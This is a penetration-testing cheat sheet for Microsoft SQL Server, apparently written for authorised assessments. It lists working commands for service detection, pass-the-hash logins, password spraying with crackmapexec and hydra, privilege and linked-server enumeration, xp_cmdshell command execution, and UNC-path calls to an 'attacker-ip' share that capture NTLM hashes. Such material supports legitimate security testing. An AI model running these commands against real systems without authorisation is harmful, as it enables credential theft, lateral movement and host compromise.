# MSSQL

## Why It Matters

MSSQL can provide:

- application data access
- password and hash exposure
- linked-server pivoting
- Windows-integrated credential validation
- operating system command execution in high-impact cases

## Workflow

1. detect the service and instance details
2. validate credentials
3. enumerate databases, users, and privileges
4. identify sysadmin or dangerous extended procedure access
5. prove data or host impact

## Detection

```bash
nmap -p 1433 -sV <ip>
nmap -p 1433 --script ms-sql-info <ip>
nmap -p 1433 --script ms-sql-ntlm-info <ip>
nmap -sU -p 1434 --script ms-sql-discover <ip>
```

UDP 1434 helps identify instances and browser service data.

## Step 1: Connect

```bash
impacket-mssqlclient DOMAIN/user:password@target -windows-auth
impacket-mssqlclient sa:password@target.com
impacket-mssqlclient username@target.com -hashes :NTHASH
sqsh -S target.com -U sa -P password
```

## Step 2: Validate And Spray

```bash
crackmapexec mssql <ip> -u users.txt -p passwords.txt
crackmapexec mssql <ip> -u users.txt -p 'Winter2024!'
hydra -L users.txt -P passwords.txt <ip> mssql
```

Prefer reused credentials or hashes first.

## Step 3: Enumeration

Useful orientation queries:

```sql
SELECT @@version;
SELECT SERVERPROPERTY('ProductVersion');
SELECT DB_NAME();
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.databases;
SELECT table_name FROM information_schema.tables;
```

Focus on:

- current user context
- whether `sysadmin` is present
- interesting databases and credential tables

## Step 4: Privilege And Pivot Checks

### Users And Roles

```sql
SELECT name FROM master.sys.server_principals;
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
EXEC sp_helprolemember;
```

### Linked Servers

```sql
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
EXEC ('SELECT @@version') AT [LinkedServerName];
```

Linked servers can turn one foothold into lateral database access.

## Step 5: High-Impact Abuse

### `xp_cmdshell`

```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
```

If it is disabled but you are effectively `sysadmin`, it may be possible to enable it. That is a high-impact host-level path.

### File And Share Interaction

```sql
EXEC master..xp_dirtree 'C:\', 1, 1;
EXEC master..xp_fileexist 'C:\Windows\win.ini';
```

### Hash Capture Via UNC Paths

```sql
EXEC xp_dirtree '\\attacker-ip\share';
EXEC xp_fileexist '\\attacker-ip\share\file';
```

This can force outbound authentication from the SQL Server service account.

## Pitfalls

- assuming database access automatically means `sysadmin`
- enabling host-level abuse before you understand your privilege level
- ignoring linked servers and impersonation opportunities

## Reporting Notes

Capture:

- credential type used
- database and role context
- sensitive data exposed
- whether host-level command execution or outbound auth was possible
- any linked-server or lateral movement implications

## Fast Checklist

```text
1. Detect instance details
2. Validate credentials or hashes
3. Enumerate DBs, users, and roles
4. Check sysadmin, linked servers, and dangerous procedures
5. Prove data or host impact cleanly
```
